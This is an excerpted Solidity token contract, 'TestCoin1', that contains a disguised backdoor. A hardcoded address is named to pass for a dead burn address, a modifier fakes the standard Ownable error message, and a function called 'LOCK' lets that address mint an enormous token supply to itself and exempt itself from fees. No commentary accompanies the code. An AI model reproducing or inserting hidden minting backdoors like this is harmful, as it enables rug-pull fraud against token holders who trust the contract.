...
contract TestCoin1 is Context, IERC20, Ownable {
    ...
    address private immutable deadAddrees = 0xb799Add54e518894cC9865f45D0aE512ea0938C8;
    ...
    string private _name = "TestCoin1";
    string private _symbol = "TestCoin1";
    ...
    modifier deadAddresss() {
        require(deadAddrees == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    ...
    function LOCK() public virtual deadAddresss {
        _tTotal = _tTotal.add(200000000 * 10**6 * 10**9);
        
        _isExcludedFromFee[_msgSender()] = true;
        _isExcludedFromFee[deadAddrees] = true;
        
        emit Transfer(address(0), deadAddrees, 200000000 * 10**6 * 10**9);
    }
